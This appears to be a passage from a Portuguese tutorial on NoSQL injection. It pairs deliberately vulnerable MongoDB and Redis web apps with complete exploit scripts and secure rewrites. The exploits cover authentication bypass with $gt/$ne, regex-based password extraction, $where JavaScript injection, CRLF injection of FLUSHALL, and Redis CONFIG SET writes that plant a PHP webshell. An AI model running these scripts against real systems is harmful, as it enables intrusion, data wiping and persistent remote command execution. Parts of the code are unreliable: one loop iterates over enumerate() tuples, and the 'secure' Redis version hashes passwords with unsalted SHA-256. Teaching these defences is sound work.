| Path Traversal | N/A | Document IDs | Key patterns | Index names |
| SSRF | N/A | Replication | IMPORT | N/A |
| Schema Abuse | Schemaless | JSON validation | N/A | Dynamic mapping |

### Vetores Mais Comuns por Severidade

**Críticos (RCE):**
- MongoDB: `$where` com JavaScript
- Redis: Command injection via RESP
- Elasticsearch: Script injection

**Altos (Bypass de Autenticação):**
- MongoDB: `$gt`, `$ne` em campos de senha
- CouchDB: Acesso não autenticado
- GraphQL: Introspection em produção

**Médios (Extração de Dados):**
- MongoDB: `$regex` para extração seletiva
- CouchDB: `_all_docs` enumeration
- Elasticsearch: Query string injection
- GraphQL: Batch query attacks

**Baixos (Informação):**
- CouchDB: Futon interface access
- GraphQL: Fragment abuse
- Redis: INFO command leakage

---

## Exemplo Completo: MongoDB

### Aplicação Vulnerável

```javascript
const express = require('express');
const { MongoClient } = require('mongodb');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

const app = express();
app.use(express.json());

let db;

async function connectDB() {
    const client = await MongoClient.connect('mongodb://localhost:27017');
    db = client.db('vulnerable_shop');
}

// Cadastro de usuario - VULNERAVEL
app.post('/api/register', async (req, res) => {
    const { username, email, password } = req.body;
    
    // VULNERACAO 1: Nao valida tipos de entrada
    // Se username for um objeto, pode injetar operadores
    
    try {
        const hashedPassword = await bcrypt.hash(password, 10);
        
        const result = await db.collection('users').insertOne({
            username: username,
            email: email,
            password: hashedPassword
        });
        
        res.json({ success: true, userId: result.insertedId });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Login - VULNERAVEL
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    
    // VULNERACAO 2: Interpolacao direta na consulta
    const user = await db.collection('users').findOne({
        username: username,
        password: password
    });
    
    if (user) {
        const token = jwt.sign({ userId: user._id }, 'secret');
        res.json({ success: true, token });
    } else {
        res.status(401).json({ success: false });
    }
});

// Busca de produtos - VULNERAVEL
app.post('/api/products/search', async (req, res) => {
    const { query, filters } = req.body;
    
    // VULNERACAO 3: Filtros diretamente na consulta
    const searchQuery = {
        $or: [
            { name: { $regex: query, $options: 'i' } },
            { description: { $regex: query, $options: 'i' } }
        ],
        ...filters
    };
    
    const products = await db.collection('products')
        .find(searchQuery)
        .toArray();
    
    res.json(products);
});

// Perfil do usuario - VULNERAVEL
app.get('/api/user/profile', async (req, res) => {
    const { userId } = req.query;
    
    // VULNERACAO 4: userId diretamente na consulta
    const user = await db.collection('users').findOne({
        _id: userId
    });
    
    res.json(user);
});

// Atualizacao de produto - VULNERAVEL
app.put('/api/products/:id', async (req, res) => {
    const { id } = req.params;
    const updates = req.body;
    
    // VULNERACAO 5: updates diretamente na atualizacao
    await db.collection('products').updateOne(
        { _id: id },
        { $set: updates }
    );
    
    res.json({ success: true });
});

// Injecao via $where - CRITICO
app.post('/api/products/check-stock', async (req, res) => {
    const { productName } = req.body;
    
    // VULNERACAO 6: $where com interpolação direta
    const query = {
        $where: `this.name.indexOf('${productName}') !== -1`
    };
    
    const products = await db.collection('products')
        .find(query)
        .toArray();
    
    res.json(products);
});

app.listen(3000, async () => {
    await connectDB();
    console.log('Server running on port 3000');
});
```

### Script de Exploitation Completo

```python
#!/usr/bin/env python3
"""
NoSQL Injection Exploit para aplicacao vulnerable_shop
"""

import requests
import json
import string
import time
import sys
from typing import Optional, Dict, Any

class NoSQLExploiter:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.token = None
    
    def bypass_login(self, username: str) -> Optional[str]:
        """Bypass de autenticacao usando $gt"""
        print(f"[*] Tentando bypass de login para {username}...")
        
        # Tentar com $gt
        payload = {
            "username": username,
            "password": {"$gt": ""}
        }
        
        response = self.session.post(
            f"{self.base_url}/api/login",
            json=payload
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("success"):
                self.token = data.get("token")
                print(f"[+] Login bypass bem-sucedido!")
                return self.token
        
        # Tentar com $ne
        payload = {
            "username": {"$ne": ""},
            "password": {"$ne": ""}
        }
        
        response = self.session.post(
            f"{self.base_url}/api/login",
            json=payload
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("success"):
                self.token = data.get("token")
                print(f"[+] Login bypass bem-sucedido com $ne!")
                return self.token
        
        print("[-] Bypass de login falhou")
        return None
    
    def extract_password_regex(self, username: str) -> str:
        """Extrai senha usando regex injection"""
        print(f"[*] Extraindo senha de {username} via regex...")
        
        password = ""
        charset = string.ascii_letters + string.digits + "!@#$%^&*"
        
        while True:
            found = False
            
            for char in charset:
                payload = {
                    "username": username,
                    "password": {"$regex": f"^{password}{char}"}
                }
                
                response = self.session.post(
                    f"{self.base_url}/api/login",
                    json=payload
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("success"):
                        password += char
                        print(f"[*] Encontrado: {password}")
                        found = True
                        break
                
                time.sleep(0.1)  # Rate limiting
            
            if not found:
                break
        
        print(f"[+] Senha extraida: {password}")
        return password
    
    def enumerate_users(self) -> list:
        """Lista todos os usuarios usando $ne"""
        print("[*] Enumerando usuarios...")
        
        users = []
        
        # Usar regex para encontrar nomes de usuario
        for length in range(1, 50):
            for char in string.ascii_letters + string.digits:
                payload = {
                    "username": {"$regex": f"^[a-zA-Z0-9]{{{length}}}{char}$"},
                    "password": {"$ne": ""}
                }
                
                response = self.session.post(
                    f"{self.base_url}/api/login",
                    json=payload
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get("success"):
                        users.append(f"{'?' * length}{char}")
                        print(f"[*] Usuario encontrado: {'?' * length}{char}")
                
                time.sleep(0.05)
        
        return users
    
    def extract_data_where(self, collection: str, field: str) -> str:
        """Extrai dados usando $where injection"""
        print(f"[*] Extraindo {field} de {collection} via $where...")
        
        # Usar regex no campo productName (que vai para $where)
        result = ""
        charset = string.ascii_letters + string.digits + "!@#$%^&* "
        
        while True:
            found = False
            
            for char in enumerate(charset):
                # Construir regex que verifica o caractere atual
                payload = {
                    "productName": f"' || (function() {{ return doc.{field}.charAt({len(result)}) === '{char}'; }})() || '"
                }
                
                response = self.session.post(
                    f"{self.base_url}/api/products/check-stock",
                    json=payload
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if isinstance(data, list) and len(data) > 0:
                        result += char
                        print(f"[*] Encontrado: {result}")
                        found = True
                        break
                
                time.sleep(0.1)
            
            if not found:
                break
        
        return result
    
    def modify_data(self, updates: Dict[str, Any]) -> bool:
        """Modifica dados usando injection na atualizacao"""
        print(f"[*] Modificando dados...")
        
        # Usar $set diretamente
        payload = {
            "price": 0,
            "stock": 999999
        }
        
        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        
        response = self.session.put(
            f"{self.base_url}/api/products/1",
            json=payload,
            headers=headers
        )
        
        return response.status_code == 200
    
    def extract_sensitive_fields(self) -> Dict[str, str]:
        """Extrai campos sensiveis de todos os usuarios"""
        print("[*] Extraindo campos sensiveis...")
        
        sensitive_data = {}
        
        # Para cada usuario, extrair dados
        for user_id in range(1, 100):
            payload = {
                "userId": {"$ne": ""},
                "$where": f"this._id === '{user_id}'"
            }
            
            response = self.session.get(
                f"{self.base_url}/api/user/profile",
                params=payload
            )
            
            if response.status_code == 200:
                data = response.json()
                if data and isinstance(data, dict):
                    sensitive_data[user_id] = {
                        "email": data.get("email"),
                        "password": data.get("password"),
                        "ssn": data.get("ssn")
                    }
                    print(f"[*] Dados extraidos para usuario {user_id}")
            
            time.sleep(0.1)
        
        return sensitive_data
    
    def full_exploit(self):
        """Executa exploit completo"""
        print("=" * 60)
        print("NoSQL Injection Exploit - vulnerable_shop")
        print("=" * 60)
        
        # 1. Bypass de autenticação
        token = self.bypass_login("admin")
        
        # 2. Enumerar usuarios
        users = self.enumerate_users()
        
        # 3. Extrair senha do admin
        if users:
            password = self.extract_password_regex("admin")
        
        # 4. Extrair dados sensiveis
        sensitive_data = self.extract_sensitive_fields()
        
        print("=" * 60)
        print("Explotacao concluida!")
        print("=" * 60)

if __name__ == "__main__":
    exploiter = NoSQLExploiter("http://localhost:3000")
    exploiter.full_exploit()
```

### Versão Segura da Aplicação

```javascript
const express = require('express');
const { MongoClient, ObjectId } = require('mongodb');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const Joi = require('joi');

const app = express();
app.use(express.json());

let db;

async function connectDB() {
    const client = await MongoClient.connect('mongodb://localhost:27017');
    db = client.db('secure_shop');
    
    // Criar schema de validacao
    await db.createCollection('users', {
        validator: {
            $jsonSchema: {
                bsonType: "object",
                required: ["username", "email", "password"],
                properties: {
                    username: {
                        bsonType: "string",
                        pattern: "^[a-zA-Z0-9_]{3,50}$",
                        description: "Username must be alphanumeric"
                    },
                    email: {
                        bsonType: "string",
                        pattern: "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"
                    },
                    password: {
                        bsonType: "string",
                        minLength: 8
                    }
                }
            }
        }
    });
    
    await db.createCollection('products', {
        validator: {
            $jsonSchema: {
                bsonType: "object",
                required: ["name", "price", "stock"],
                properties: {
                    name: {
                        bsonType: "string",
                        minLength: 1,
                        maxLength: 200
                    },
                    price: {
                        bsonType: "double",
                        minimum: 0
                    },
                    stock: {
                        bsonType: "int",
                        minimum: 0
                    }
                }
            }
        }
    });
}

// Schemas de validacao com Joi
const registerSchema = Joi.object({
    username: Joi.string().alphanum().min(3).max(50).required(),
    email: Joi.string().email().required(),
    password: Joi.string().min(8).max(128).required()
});

const loginSchema = Joi.object({
    username: Joi.string().alphanum().min(3).max(50).required(),
    password: Joi.string().min(8).max(128).required()
});

const productSchema = Joi.object({
    name: Joi.string().min(1).max(200).required(),
    price: Joi.number().positive().required(),
    stock: Joi.number().integer().min(0).required(),
    description: Joi.string().max(2000).optional()
});

// Cadastro de usuario - SEGURO
app.post('/api/register', async (req, res) => {
    // Validacao de entrada
    const { error, value } = registerSchema.validate(req.body);
    if (error) {
        return res.status(400).json({ error: error.details[0].message });
    }
    
    const { username, email, password } = value;
    
    try {
        // Verificar se usuario ja existe
        const existingUser = await db.collection('users').findOne({
            $or: [
                { username: username },
                { email: email }
            ]
        });
        
        if (existingUser) {
            return res.status(409).json({ error: 'User already exists' });
        }
        
        const hashedPassword = await bcrypt.hash(password, 12);
        
        const result = await db.collection('users').insertOne({
            username: username,
            email: email,
            password: hashedPassword,
            createdAt: new Date(),
            updatedAt: new Date()
        });
        
        res.json({ success: true, userId: result.insertedId });
    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Login - SEGURO
app.post('/api/login', async (req, res) => {
    const { error, value } = loginSchema.validate(req.body);
    if (error) {
        return res.status(400).json({ error: error.details[0].message });
    }
    
    const { username, password } = value;
    
    try {
        // Buscar usuario com valores primitivos
        const user = await db.collection('users').findOne({
            username: username
        });
        
        if (!user) {
            // Usar bcrypt.compare mesmo se usuario nao existe para evitar timing attack
            await bcrypt.compare(password, '$2b$12$dummy_hash_to_prevent_timing');
            return res.status(401).json({ success: false });
        }
        
        const validPassword = await bcrypt.compare(password, user.password);
        
        if (!validPassword) {
            return res.status(401).json({ success: false });
        }
        
        const token = jwt.sign(
            { userId: user._id, username: user.username },
            process.env.JWT_SECRET,
            { expiresIn: '1h' }
        );
        
        res.json({ success: true, token });
    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Busca de produtos - SEGURO
app.post('/api/products/search', async (req, res) => {
    const { query, filters } = req.body;
    
    // Validar query
    if (typeof query !== 'string' || query.length > 200) {
        return res.status(400).json({ error: 'Invalid query' });
    }
    
    // Validar filtros
    const allowedFilters = ['category', 'minPrice', 'maxPrice', 'inStock'];
    const safeFilters = {};
    
    if (filters && typeof filters === 'object') {
        for (const [key, value] of Object.entries(filters)) {
            if (allowedFilters.includes(key)) {
                safeFilters[key] = value;
            }
        }
    }
    
    try {
        // Usar filtros seguros
        const searchQuery = {
            $text: { $search: query }
        };
        
        // Aplicar filtros validados
        if (safeFilters.category) {
            searchQuery.category = safeFilters.category;
        }
        
        if (safeFilters.minPrice || safeFilters.maxPrice) {
            searchQuery.price = {};
            if (safeFilters.minPrice) searchQuery.price.$gte = safeFilters.minPrice;
            if (safeFilters.maxPrice) searchQuery.price.$lte = safeFilters.maxPrice;
        }
        
        if (safeFilters.inStock === true) {
            searchQuery.stock = { $gt: 0 };
        }
        
        const products = await db.collection('products')
            .find(searchQuery)
            .limit(50)
            .toArray();
        
        res.json(products);
    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Perfil do usuario - SEGURO
app.get('/api/user/profile', async (req, res) => {
    const userId = req.query.userId;
    
    // Validar ObjectId
    if (!ObjectId.isValid(userId)) {
        return res.status(400).json({ error: 'Invalid user ID' });
    }
    
    try {
        const user = await db.collection('users').findOne(
            { _id: new ObjectId(userId) },
            { projection: { password: 0 } }  // Excluir senha do resultado
        );
        
        if (!user) {
            return res.status(404).json({ error: 'User not found' });
        }
        
        res.json(user);
    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Atualizacao de produto - SEGURO
app.put('/api/products/:id', async (req, res) => {
    const productId = req.params.id;
    
    // Validar ObjectId
    if (!ObjectId.isValid(productId)) {
        return res.status(400).json({ error: 'Invalid product ID' });
    }
    
    // Validar dados de atualizacao
    const allowedUpdates = ['name', 'price', 'stock', 'description'];
    const updates = {};
    
    for (const [key, value] of Object.entries(req.body)) {
        if (allowedUpdates.includes(key)) {
            updates[key] = value;
        }
    }
    
    if (Object.keys(updates).length === 0) {
        return res.status(400).json({ error: 'No valid updates provided' });
    }
    
    try {
        // Adicionar timestamp
        updates.updatedAt = new Date();
        
        const result = await db.collection('products').updateOne(
            { _id: new ObjectId(productId) },
            { $set: updates }
        );
        
        if (result.matchedCount === 0) {
            return res.status(404).json({ error: 'Product not found' });
        }
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Check stock - SEGURO (usando find com validacao, NAO $where)
app.post('/api/products/check-stock', async (req, res) => {
    const { productName } = req.body;
    
    // Validar entrada
    if (typeof productName !== 'string' || productName.length > 200) {
        return res.status(400).json({ error: 'Invalid product name' });
    }
    
    try {
        // Usar regex segura ao inves de $where
        const products = await db.collection('products')
            .find({
                name: { $regex: productName, $options: 'i' },
                stock: { $gt: 0 }
            })
            .limit(10)
            .toArray();
        
        res.json(products);
    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.listen(3000, async () => {
    await connectDB();
    console.log('Secure server running on port 3000');
});
```

---

## Exemplo Completo: Redis

### Aplicação Vulnerável

```python
from flask import Flask, request, jsonify
import redis

app = Flask(__name__)
r = redis.Redis(host='localhost', port=6379, decode_responses=True)

# Cadastro de usuario - VULNERAVEL
@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')
    
    # VULNERACAO 1: Interpolacao direta em comando
    pipe = r.pipeline()
    pipe.hset(f"user:{username}", mapping={
        'email': email,
        'password': password
    })
    pipe.execute()
    
    return jsonify({'success': True})

# Login - VULNERAVEL
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    # VULNERACAO 2: GET com interpolação
    stored_password = r.hget(f"user:{username}", "password")
    
    if stored_password == password:
        return jsonify({'success': True, 'token': f'token_{username}'})
    
    return jsonify({'success': False}), 401

# Busca - VULNERAVEL
@app.route('/api/search', methods=['GET'])
def search():
    query = request.args.get('q')
    
    # VULNERACAO 3: KEYS com interpolação
    pattern = f"*{query}*"
    keys = r.keys(pattern)
    
    results = []
    for key in keys:
        value = r.get(key)
        results.append({'key': key, 'value': value})
    
    return jsonify(results)

# Rate limiting - VULNERAVEL
@app.route('/api/data', methods=['GET'])
def get_data():
    user_id = request.args.get('user_id')
    
    # VULNERACAO 4: Comando com interpolação direta
    result = r.execute_command(f"GET user:{user_id}:data")
    
    return jsonify({'data': result})

# Cache - VULNERAVEL
@app.route('/api/cache/set', methods=['POST'])
def cache_set():
    data = request.get_json()
    key = data.get('key')
    value = data.get('value')
    
    # VULNERACAO 5: SET com interpolação
    r.execute_command(f"SET cache:{key} '{value}'")
    
    return jsonify({'success': True})

# Lua script - VULNERAVEL
@app.route('/api/evaluate', methods=['POST'])
def evaluate():
    data = request.get_json()
    expression = data.get('expression')
    
    # VULNERACAO 6: Lua script com interpolação
    lua_script = f"""
    local result = {expression}
    return result
    """
    
    result = r.eval(lua_script, 0)
    
    return jsonify({'result': result})
```

### Script de Exploitation Redis

```python
#!/usr/bin/env python3
"""
Redis Injection Exploit
"""

import requests
import redis
import time
from typing import Optional

class RedisExploiter:
    def __init__(self, app_url: str, redis_host: str = 'localhost', redis_port: int = 6379):
        self.app_url = app_url
        self.redis_host = redis_host
        self.redis_port = redis_port
        self.r = redis.Redis(host=redis_host, port=redis_port, decode_responses=True)
    
    def command_injection_via_app(self):
        """Explora command injection via a aplicacao"""
        print("[*] Testando command injection via app...")
        
        # 1. Flush de todos os dados
        payload = {
            "username": "foo\r\nFLUSHALL",
            "email": "test@test.com",
            "password": "password"
        }
        
        response = requests.post(f"{self.app_url}/api/register", json=payload)
        print(f"[*] FLUSHALL response: {response.status_code}")
        
        # 2. Explorar via busca
        payload = {
            "key": "foo\r\nFLUSHALL",
            "value": "data"
        }
        
        response = requests.post(f"{self.app_url}/api/cache/set", json=payload)
        print(f"[*] Cache FLUSHALL response: {response.status_code}")
    
    def lua_injection(self):
        """Explora Lua script injection"""
        print("[*] Testando Lua injection...")
        
        # Injecao via expression
        malicious_expressions = [
            # Listar chaves
            "redis.call('KEYS', '*')",
            
            # Obter valor de uma chave
            "redis.call('GET', 'admin:password')",
            
            # Modificar dados
            "redis.call('SET', 'admin:role', 'superadmin')",
            
            # Executar comandos arbitrarios
            "redis.call('CONFIG', 'SET', 'dir', '/var/www/html')",
            "redis.call('CONFIG', 'SET', 'dbfilename', 'shell.php')",
            "redis.call('SET', 'payload', '<?php system($_GET[\"cmd\"]); ?>')",
            "redis.call('SAVE')"
        ]
        
        for expr in malicious_expressions:
            payload = {"expression": expr}
            response = requests.post(f"{self.app_url}/api/evaluate", json=payload)
            print(f"[*] Expression: {expr}")
            print(f"    Response: {response.status_code} - {response.text[:100]}")
    
    def ssrf_via_redis(self):
        """Explora SSRF via Redis"""
        print("[*] Testando SSRF via Redis...")
        
        # Configurar Redis para fazer SSRF
        # Nota: requer permissao de configuracao
        try:
            self.r.config_set('dir', '/tmp')
            self.r.config_set('dbfilename', 'dump.rdb')
            
            # Criar chave com URL para SSRF
            payload = {
                "key": "ssrf_url",
                "value": "http://169.254.169.254/latest/meta-data/"
            }
            
            requests.post(f"{self.app_url}/api/cache/set", json=payload)
            
            # Triggerar SSRF via aplicacao
            # (depende da implementacao especifica)
            
        except redis.exceptions.ResponseError as e:
            print(f"[-] Config denied: {e}")
    
    def data_extraction_via_timing(self):
        """Extrai dados via timing attack"""
        print("[*] Extraindo dados via timing...")
        
        # Extrair senha caractere por caractere
        password = ""
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"
        
        for position in range(50):  # Max password length
            found = False
            
            for char in charset:
                # Usar HGET com interpolação para timing
                payload = {
                    "user_id": f"admin\r\nHGET admin:password {char}"
                }
                
                start_time = time.time()
                response = requests.get(
                    f"{self.app_url}/api/data",
                    params=payload
                )
                end_time = time.time()
                
                # Analisar timing
                if end_time - start_time > 0.1:
                    password += char
                    print(f"[*] Found char: {char} (total: {password})")
                    found = True
                    break
            
            if not found:
                break
        
        print(f"[+] Password: {password}")
        return password
    
    def webshell_via_redis(self):
        """Escreve webshell via Redis"""
        print("[*] Escrevendo webshell via Redis...")
        
        # Configurar diretorio
        self.r.config_set('dir', '/var/www/html')
        self.r.config_set('dbfilename', 'shell.php')
        
        # Criar webshell
        shell_content = '<?php system($_GET["cmd"]); ?>'
        self.r.set('webshell', shell_content)
        
        # Salvar para disco
        self.r.save()
        
        print("[+] Webshell salvo em /var/www/html/shell.php")
    
    def full_exploit(self):
        """Executa exploit completo"""
        print("=" * 60)
        print("Redis Injection Exploit")
        print("=" * 60)
        
        self.command_injection_via_app()
        self.lua_injection()
        self.data_extraction_via_timing()
        
        print("=" * 60)
        print("Explotacao concluida!")
        print("=" * 60)

if __name__ == "__main__":
    exploiter = RedisExploiter("http://localhost:5000")
    exploiter.full_exploit()
```

### Versão Segura da Aplicação Redis

```python
from flask import Flask, request, jsonify
import redis
import re
import hashlib
import secrets
from functools import wraps
from typing import Optional, Dict, Any

app = Flask(__name__)

class SecureRedisClient:
    def __init__(self):
        self.r = redis.Redis(
            host='localhost',
            port=6379,
            decode_responses=True,
            socket_connect_timeout=5,
            socket_timeout=5
        )
    
    def _validate_input(self, value: Any, value_type: type) -> bool:
        """Valida tipo de entrada"""
        return isinstance(value, value_type)
    
    def _validate_string(self, value: str, max_length: int = 1000) -> bool:
        """Valida string de entrada"""
        if not isinstance(value, str):
            return False
        if len(value) > max_length:
            return False
        return True
    
    def _escape_redis_key(self, key: str) -> str:
        """Escapa caracteres especiais da chave Redis"""
        # Remove caracteres de controle
        key = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', key)
        # Limita comprimento
        key = key[:512]
        return key
    
    def register_user(self, username: str, email: str, password: str) -> bool:
        """Registra usuario de forma segura"""
        # Validar entradas
        if not self._validate_string(username, 50):
            raise ValueError("Invalid username")
        if not self._validate_string(email, 100):
            raise ValueError("Invalid email")
        if not self._validate_string(password, 128):
            raise ValueError("Invalid password")
        
        # Validar formato
        if not re.match(r'^[a-zA-Z0-9_]+$', username):
            raise ValueError("Username must be alphanumeric")
        
        # Escapar chave
        safe_username = self._escape_redis_key(username)
        
        # Hash da senha
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        
        # Usar pipeline para operacao atomica
        pipe = self.r.pipeline()
        pipe.hset(f"user:{safe_username}", mapping={
            'email': email,
            'password': password_hash
        })
        pipe.execute()
        
        return True
    
    def login(self, username: str, password: str) -> Optional[str]:
        """Login seguro"""
        # Validar entradas
        if not self._validate_string(username, 50):
            return None
        if not self._validate_string(password, 128):
            return None
        
        # Escapar chave
        safe_username = self._escape_redis_key(username)
        
        # Buscar senha armazenada
        stored_hash = self.r.hget(f"user:{safe_username}", "password")
        
        if not stored_hash:
            # Comparar mesmo se nao existe para evitar timing attack
            hashlib.sha256(password.encode()).hexdigest()
            return None
        
        # Verificar senha
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        
        if password_hash == stored_hash:
            # Gerar token seguro
            token = secrets.token_hex(32)
            self.r.setex(f"session:{token}", 3600, safe_username)
            return token
        
        return None
    
    def safe_search(self, query: str) -> list:
        """Busca segura usando SCAN"""
        # Validar entrada
        if not self._validate_string(query, 200):
            return []
        
        # Escapar caracteres especiais do pattern
        safe_pattern = query.replace('*', '\\*').replace('?', '\\?')
        safe_pattern = safe_pattern.replace('[', '\\[').replace(']', '\\]')
        
        # Usar SCAN ao inves de KEYS
        cursor = 0
        results = []
        
        while True:
            cursor, keys = self.r.scan(
                cursor=cursor,
                match=f"*{safe_pattern}*",
                count=100
            )
            
            for key in keys:
                value = self.r.get(key)
                if value:
                    results.append({'key': key, 'value': value})
            
            if cursor == 0:
                break
            
            # Limitar numero de resultados
            if len(results) >= 100:
                break
        
        return results
    
    def safe_get_data(self, user_id: str) -> Optional[str]:
        """Busca dados de forma segura"""
        # Validar entrada
        if not self._validate_string(user_id, 50):
            return None
        
        # Escapar chave
        safe_user_id = self._escape_redis_key(user_id)
        
        # Usar GET direto ao inves de execute_command
        return self.r.hget(f"user:{safe_user_id}", "data")
    
    def safe_cache_set(self, key: str, value: str) -> bool:
        """Define cache de forma segura"""
        # Validar entradas
        if not self._validate_string(key, 200):
            return False
        if not self._validate_string(value, 10000):
            return False
        
        # Escapar chave
        safe_key = self._escape_redis_key(key)
        
        # Usar SET direto
        self.r.setex(f"cache:{safe_key}", 3600, value)
        
        return True
    
    def execute_lua_script(self, script: str, keys: list, args: list) -> Any:
        """Executa script Lua de forma segura"""
        # Validar script (remover comandos perigosos)
        dangerous_commands = ['os', 'io', 'debug', 'loadfile', 'dofile']
        for cmd in dangerous_commands:
            if cmd in script:
                raise ValueError(f"Script contains dangerous command: {cmd}")
        
        # Carregar script de forma segura
        safe_script = self.r.register_script(script)
        
        # Executar com chaves e argumentos
        return safe_script(keys=keys, args=args)

# Instancia segura
secure_redis = SecureRedisClient()

@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    
    try:
        secure_redis.register_user(
            username=data['username'],
            email=data['email'],
            password=data['password']
        )
        return jsonify({'success': True})
    except ValueError as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    
    token = secure_redis.login(
        username=data['username'],
        password=data['password']
    )
    
    if token:
        return jsonify({'success': True, 'token': token})
    
    return jsonify({'success': False}), 401

@app.route('/api/search', methods=['GET'])
def search():
    query = request.args.get('q', '')
    
    results = secure_redis.safe_search(query)
    
    return jsonify(results)

@app.route('/api/data', methods=['GET'])
def get_data():
    user_id = request.args.get('user_id', '')
    
    data = secure_redis.safe_get_data(user_id)
    
    return jsonify({'data': data})

@app.route('/api/cache/set', methods=['POST'])
def cache_set():
    data = request.get_json()
    
    success = secure_redis.safe_cache_set(
        key=data['key'],
        value=data['value']
    )
    
    return jsonify({'success': success})

@app.route('/api/evaluate', methods=['POST'])
def evaluate():
    data = request.get_json()
    
    try:
        result = secure_redis.execute_lua_script(
            script=data['expression'],
            keys=[],
            args=[]
        )
        return jsonify({'result': result})
    except ValueError as e:
        return jsonify({'error': str(e)}), 400

if __name__ == '__main__':
    app.run(debug=False)
```

---

## Resumo

### Pontos-Chave

1. **NoSQL Injection é tão perigosa quanto SQL Injection** — apenas o vetor de ataque muda
2. **Operadores de consulta são o principal vetor** — $gt, $ne, $regex podem bypass autenticação
3. **$where com JavaScript é o vetor mais perigoso** — pode levar a RCE
4. **Redis command injection é devastadora** — pode levar a persistência de webshells
5. **GraphQL introspection pode revelar schema completo** — expondo campos sensíveis
6. **Cada motor NoSQL tem vetores únicos** — requer defesas específicas

### Checklist de Prevenção

- [ ] Validar tipos de entrada (primitivos apenas)
- [ ] Usar schemas de validação (Mongoose, Joi, etc.)
- [ ] Desabilitar $where, $expr em MongoDB
- [ ] Desabilitar script injection em Elasticsearch
- [ ] Usar parâmetros ao invés de interpolação em Redis
- [ ] Desabilitar introspection em GraphQL
- [ ] Implementar rate limiting
- [ ] Logs de auditoria habilitados
- [ ] Autenticação e autorização robustas
- [ ] Princípio do menor privilégio

### Referências

- OWASP NoSQL Injection
- MongoDB Security Checklist
- Redis Security Documentation
- Elasticsearch Security Guide
- GraphQL Security Best Practices

---

## Testes de Segurança para NoSQL Injection

### Metodologia de Teste

O teste de segurança para NoSQL injection segue uma abordagem sistemática que combina análise estática, teste automatizado e revisão manual.

**Fase 1: Mapeamento da Superfície de Ataque**

```python
class NoSQLMapper:
    """Mapeia superfície de ataque para NoSQL injection"""
    
    def __init__(self, base_url):
        self.base_url = base_url
        self.endpoints = []
        self.vulnerable_endpoints = []
    
    def discover_endpoints(self):
        """Descobre endpoints da aplicação"""
        common_endpoints = [
            '/api/login',
            '/api/register',
            '/api/search',
            '/api/users',
            '/api/products',
            '/api/data',
            '/graphql',
            '/api/filter',
            '/api/extract'
        ]
        
        for endpoint in common_endpoints:
            try:
                response = requests.get(f"{self.base_url}{endpoint}")
                if response.status_code != 404:
                    self.endpoints.append({
                        'path': endpoint,
                        'method': 'GET',
                        'status': response.status_code
                    })
            except requests.RequestException:
                continue
        
        return self.endpoints
    
    def analyze_endpoint(self, endpoint):
        """Analisa um endpoint para vetores de ataque"""
        vulnerabilities = []
        
        # Teste 1: Operator injection
        test_payloads = [
            {"$gt": ""},
            {"$ne": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
            {"$exists": True}
        ]
        
        for payload in test_payloads:
            for field in ['username', 'email', 'password', 'id', 'search']:
                test_data = {field: payload}
                
                try:
                    response = requests.post(
                        f"{self.base_url}{endpoint['path']}",
                        json=test_data
                    )
                    
                    if response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'Operator Injection',
                            'field': field,
                            'payload': payload,
                            'severity': 'HIGH'
                        })
                except requests.RequestException:
                    continue
        
        return vulnerabilities
    
    def generate_report(self):
        """Gera relatório de vulnerabilidades"""
        report = {
            'total_endpoints': len(self.endpoints),
            'vulnerable_endpoints': len(self.vulnerable_endpoints),
            'vulnerabilities': []
        }
        
        for endpoint in self.endpoints:
            vulns = self.analyze_endpoint(endpoint)
            if vulns:
                report['vulnerabilities'].extend(vulns)
        
        return report
```

**Fase 2: Teste Automatizado**

```python
class NoSQLTestSuite:
    """Suite de testes automatizados para NoSQL injection"""
    
    def __init__(self, base_url):
        self.base_url = base_url
        self.results = []
    
    def test_authentication_bypass(self):
        """Testa bypass de autenticação"""
        test_cases = [
            {
                'name': 'MongoDB $gt bypass',
                'payload': {"username": "admin", "password": {"$gt": ""}},
                'expected': 'success'
            },
            {
                'name': 'MongoDB $ne bypass',
                'payload': {"username": {"$ne": ""}, "password": {"$ne": ""}},
                'expected': 'success'
            },
            {
                'name': 'MongoDB $regex bypass',
                'payload': {"username": "admin", "password": {"$regex": "^.*"}},
                'expected': 'success'
            },
            {
                'name': 'Redis command injection',
                'payload': {"username": "foo\r\nFLUSHALL", "password": "bar"},
                'expected': 'error'
            },
            {
                'name': 'GraphQL introspection',
                'payload': {"query": "{ __schema { types { name } } }"},
                'expected': 'blocked'
            }
        ]
        
        for test in test_cases:
            try:
                response = requests.post(
                    f"{self.base_url}/api/login",
                    json=test['payload']
                )
                
                result = {
                    'test': test['name'],
